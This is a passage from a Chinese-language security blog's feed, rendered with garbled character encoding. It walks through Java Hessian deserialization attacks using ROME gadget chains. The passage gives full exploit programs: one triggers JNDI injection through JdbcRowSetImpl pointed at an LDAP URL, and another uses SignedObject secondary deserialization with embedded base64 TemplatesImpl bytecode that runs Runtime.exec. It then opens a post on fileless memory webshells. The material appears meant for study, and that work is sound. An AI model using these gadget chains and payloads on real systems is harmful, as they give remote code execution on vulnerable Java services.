<span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åŒ…è£…ååºåˆ—åŒ–çš„å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//åå°„è®¾ç½®value</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//åå°„è·å–value</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:9999/EXP&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = serialize(hashMap);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println((HashMap)deserialize(s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç”¨åå°„åŠ¨æ€åˆ›å»ºæ•°ç»„ï¼Œé˜²æ­¢åœ¨ç‹—ä»” gadget çš„æ—¶å€™è§¦å‘ put æ–¹æ³•å¯¼è‡´ RCEã€‚</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.until.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>Romeçš„rceè¿‡ç¨‹</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;</span><br><span class="line">  _cachedTypeDeserializerMap.put(type, deserializer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¿›å…¥è§¦å‘ç‚¹ï¼Œæ¥ç€è°ƒç”¨ EqualBean çš„ hashcode æ–¹æ³•</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236540.png"                      alt="image-20230124203554850"                ><figcaption>image-20230124203554850</figcaption></figure></p><p>æ¥ç€ä¼šè§¦å‘ ToStringBean çš„ toString æ–¹æ³•ï¼ˆè¿™é‡Œå°±æœ‰å¾ˆå¤šå…¶å®ƒå»¶ç”³äº†ï¼Œæ¯”å¦‚å¯ä»¥æ¥ä¸€ä¸ª CC5ï¼‰</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236941.png"                      alt="image-20230124203614807"                ><figcaption>image-20230124203614807</figcaption></figure></p><p>æ¥ç€è¿›å…¥ JdbcRowSetImp çš„ toString æ–¹æ³•ï¼Œåœ¨å…¶ä¸­ä¼šè°ƒç”¨ JdbcRowSetImp çš„ getter</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236500.png"                      alt="image-20230124203639615"                ><figcaption>image-20230124203639615</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236710.png"                      alt="image-20230124203654578"                ><figcaption>image-20230124203654578</figcaption></figure></p><p>å½“è°ƒç”¨åˆ° getDatabaseMetaData çš„æ—¶å€™ï¼Œä¼šè¿›å…¥ connect æ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨ lookup è§¦å‘ jndi æ³¨å…¥ã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236799.png"                      alt="image-20230124203716717"                ><figcaption>image-20230124203716717</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236183.png"                      alt="image-20230124203736906"                ><figcaption>image-20230124203736906</figcaption></figure></p><h2 id="ä¸å‡ºç½‘æ‰“æ³•ï¼ˆROMEï¼‰"><a href="#ä¸å‡ºç½‘æ‰“æ³•ï¼ˆROMEï¼‰" class="headerlink" title="ä¸å‡ºç½‘æ‰“æ³•ï¼ˆROMEï¼‰"></a>ä¸å‡ºç½‘æ‰“æ³•ï¼ˆROMEï¼‰</h2><p><code>hessian</code>ååºåˆ—åŒ–ä¾èµ–<code>rome</code>çš„ä¸å‡ºç½‘åˆ©ç”¨æ–¹å¼</p><h4 id="SignedObjectäºŒæ¬¡ååºåˆ—åŒ–"><a href="#SignedObjectäºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="SignedObjectäºŒæ¬¡ååºåˆ—åŒ–"></a>SignedObjectäºŒæ¬¡ååºåˆ—åŒ–</h4><p>åœ¨<code>java.security.SignedObject</code>ä¸­æœ‰ä¸€ä¸ª<code>getObject</code>æ–¹æ³•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// creating a stream pipe-line, from b to a</span></span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(<span class="built_in">this</span>.content);</span><br><span class="line">    <span class="type">ObjectInput</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> a.readObject();</span><br><span class="line">    b.close();</span><br><span class="line">    a.close();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>æ˜¯ä¸€ä¸ªåŸç”Ÿååºåˆ—åŒ–ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™é‡Œå®ç°äºŒæ¬¡ååºåˆ—åŒ–ä»è€Œå®ç°RCEã€‚</p></blockquote><p>EXP</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> sun.security.provider.DSAPrivateKey;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">romeExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, SignatureException, InvalidKeyException &#123;</span><br><span class="line">        HashMap hashMapx=getObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ SignedObjectå¯¹è±¡</span></span><br><span class="line">        SignedObject signedObject=<span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMapx, <span class="keyword">new</span> <span class="title class_">DSAPrivateKey</span>(), <span class="keyword">new</span> <span class="title class_">Signature</span>(<span class="string">&quot;x&quot;</span>) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">engineInitVerify</span><span class="params">(PublicKey publicKey)</span> <span class="keyword">throws</span> InvalidKeyException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">engineInitSign</span><span class="params">(PrivateKey privateKey)</span> <span class="keyword">throws</span> InvalidKeyException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">engineUpdate</span><span class="params">(<span class="type">byte</span> b)</span> <span class="keyword">throws</span> SignatureException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">engineUpdate</span><span class="params">(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> SignatureException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="type">byte</span>[] engineSign() <span class="keyword">throws</span> SignatureException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">engineVerify</span><span class="params">(<span class="type">byte</span>[] sigBytes)</span> <span class="keyword">throws</span> SignatureException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">engineSetParameter</span><span class="params">(String param, Object value)</span> <span class="keyword">throws</span> InvalidParameterException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">engineGetParameter</span><span class="params">(String param)</span> <span class="keyword">throws</span> InvalidParameterException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ ToStringBean</span></span><br><span class="line">        ToStringBean toStringBean=<span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class,signedObject);</span><br><span class="line">        ToStringBean toStringBean1=<span class="keyword">new</span> <span class="title class_">ToStringBean</span>(String.class,<span class="string">&quot;s&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ ObjectBean</span></span><br><span class="line">        ObjectBean objectBean=<span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ HashMap</span></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean,<span class="string">&quot;novic4&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹å­—æ®µ</span></span><br><span class="line">        Field obj= EqualsBean.class.getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        Field equalsBean=ObjectBean.class.getDeclaredField(<span class="string">&quot;_equalsBean&quot;</span>);</span><br><span class="line"></span><br><span class="line">        obj.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        equalsBean.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        obj.set(equalsBean.get(objectBean),toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        HessianOutput hessianOutput=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(ser);</span><br><span class="line">        hessianOutput.writeObject(hashMap);</span><br><span class="line">        hessianOutput.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(ser);</span><br><span class="line">        HessianInput hessianInput=<span class="keyword">new</span> <span class="title class_">HessianInput</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser.toByteArray()));</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String name,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·å–åŸç”Ÿååºåˆ—åŒ–å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//æ„é€ TemplatesImplå¯¹è±¡</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode= Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIAoABgATCgAUABUIABYKABQAFwcACQcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAZAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAAlDb2RlLmphdmEMAAcACAcAGwwAHAAdAQAEY2FsYwwAHgAfAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEgALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytee= <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytee);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Code&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ ToStringBean</span></span><br><span class="line">        ToStringBean toStringBean=<span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templates);</span><br><span class="line">        ToStringBean toStringBean1=<span class="keyword">new</span> <span class="title class_">ToStringBean</span>(String.class,<span class="string">&quot;s&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ ObjectBean</span></span><br><span class="line">        ObjectBean objectBean=<span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ HashMap</span></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean,<span class="string">&quot;novic4&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹å­—æ®µ</span></span><br><span class="line">        Field obj=EqualsBean.class.getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        Field equalsBean=ObjectBean.class.getDeclaredField(<span class="string">&quot;_equalsBean&quot;</span>);</span><br><span class="line"></span><br><span class="line">        obj.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        equalsBean.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        obj.set(equalsBean.get(objectBean),toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWebå†…å­˜é©¬å­¦ä¹ </title>
      <link href="/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaWebå†…å­˜é©¬"><a href="#JavaWebå†…å­˜é©¬" class="headerlink" title="JavaWebå†…å­˜é©¬"></a>JavaWebå†…å­˜é©¬</h1><h2 id="0x00-å‰ç½®çŸ¥è¯†"><a href="#0x00-å‰ç½®çŸ¥è¯†" class="headerlink" title="0x00 å‰ç½®çŸ¥è¯†"></a>0x00 å‰ç½®çŸ¥è¯†</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>å†…å­˜é©¬åˆåæ— æ–‡ä»¶é©¬ï¼Œè§åçŸ¥æ„ï¼Œä¹Ÿå°±æ˜¯æ— æ–‡ä»¶è½åœ°çš„ webshell æŠ€æœ¯ï¼Œæ˜¯ç”±äº webshell ç‰¹å¾è¯†åˆ«ã€é˜²ç¯¡æ”¹ã€ç›®å½•ç›‘æ§ç­‰ç­‰é’ˆå¯¹ web åº”ç”¨ç›®å½•æˆ–æœåŠ¡å™¨æ–‡ä»¶é˜²å¾¡æ‰‹æ®µçš„ä»‹å…¥ï¼Œå¯¼è‡´çš„æ–‡ä»¶ shell éš¾ä»¥å†™å…¥å’ŒæŒä¹…è€Œè¡ç”Ÿå‡ºçš„ä¸€ç§â€œæ¦‚å¿µå‹â€æœ¨é©¬ã€‚è¿™ç§æŠ€æœ¯çš„æ ¸å¿ƒæ€æƒ³éå¸¸ç®€å•ï¼Œä¸€å¥è¯å°±èƒ½æ¦‚æ‹¬ï¼Œé‚£å°±æ˜¯å¯¹è®¿é—®è·¯å¾„æ˜ å°„åŠç›¸å…³å¤„ç†ä»£ç çš„<strong>åŠ¨æ€æ³¨å†Œ</strong>ã€‚</p><h3 id="Tomcatä¸­çš„ä¸‰ç§Context"><a href="#Tomcatä¸­çš„ä¸‰ç§Context" class="headerlink" title="Tomcatä¸­çš„ä¸‰ç§Context"></a>Tomcatä¸­çš„ä¸‰ç§Context</h3><p>åœ¨Tomcatä¸­ï¼ŒContextæ˜¯Containerç»„ä»¶çš„ä¸€ç§å­å®¹å™¨ï¼Œå…¶å¯¹åº”çš„æ˜¯ä¸€ä¸ªWebåº”ç”¨ã€‚Contextä¸­å¯ä»¥åŒ…å«å¤šä¸ªWrapperå®¹å™¨ï¼Œè€ŒWrapperå¯¹åº”çš„æ˜¯ä¸€ä¸ªå…·ä½“çš„Servletå®šä¹‰ã€‚å› æ­¤Contextå¯ä»¥ç”¨æ¥ä¿å­˜ä¸€ä¸ªWebåº”ç”¨ä¸­å¤šä¸ªServletçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301312147565.png"                      alt="image-20230131214733513"                ><figcaption>image-20230131214733513</figcaption></figure></p><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" 